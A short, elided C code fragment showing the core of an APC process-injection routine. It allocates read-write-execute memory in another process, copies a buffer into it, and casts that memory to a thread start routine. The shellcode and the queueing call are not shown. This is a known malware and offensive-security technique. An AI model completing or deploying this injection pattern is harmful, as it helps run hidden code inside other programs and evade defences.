...
int main()
{
    ...
    buf_routine = VirtualAllocEx(pi.hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, buf_routine, buf, sizeof(buf), NULL);

    PTHREAD_START_ROUTINE apc_routine = (PTHREAD_START_ROUTINE)buf_routine;
